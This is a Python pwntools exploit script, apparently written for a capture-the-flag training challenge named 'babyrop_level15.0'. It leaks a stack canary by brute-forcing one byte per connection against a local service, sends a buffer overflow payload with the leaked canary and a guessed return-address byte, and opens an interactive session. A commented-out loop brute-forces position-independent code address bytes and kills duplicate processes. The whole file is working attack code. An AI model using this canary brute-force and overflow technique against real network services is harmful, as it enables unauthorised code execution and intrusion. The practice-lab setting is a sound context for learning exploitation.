from pwn import *
import os
first_pid = os.popen('pidof /challenge/babyrop_level15.0').read().strip()


def kill_dup_ps(id):
    l = os.popen('pidof /challenge/babyrop_level15.0').read().strip().split(' ')
    if len(l) == 1 :
        return
    
    for i in range(len(l)) :
        if l[i] != id:
            os.system(f'kill {l[i]}')


canary = b'\x00'
### leak canary 
for i in range(7):
    guess = 1

    while True:
        b_guess = int.to_bytes(guess,1,'little')
        r = remote('0.0.0.0','1337')
        r.send(b'a'*0x28+canary+b_guess)
        r.recvuntil(b'Leaving!\n')
        a = r.recv(timeout=0.5)
        
        if b'smashing' not in a :
            canary += b_guess
            print(canary)
            r.close()
            break

        guess += 1 
        r.close()

canary = u64(canary)


guess = 0x00
pie = b''
r = remote('0.0.0.0','1337')
r.send(b'\x00'*0x68 + p64(canary) + p64(0)+ pie + int.to_bytes(guess,1,'little'))
r.interactive()
# for i in range(16):
#     try :
#         r = remote('0.0.0.0','1337')
#         r.send(b'\x00'*0x68 + p64(canary) + p64(0)+ pie + int.to_bytes(guess,1,'little'))
#         r.recvuntil(b'Goodbye!\n')
#         a = r.recv(timeout=0.2)
#         if b'Welcome' not in a:
#             raise error      
#     ## guess to challenge address
#         pie += int.to_bytes(guess,1,'little')
#         print(hex(guess))
#         r.close()
#         kill_dup_ps(first_pid)
#         break
#     except:
#         guess += 0x10
#         r.close()
#         continue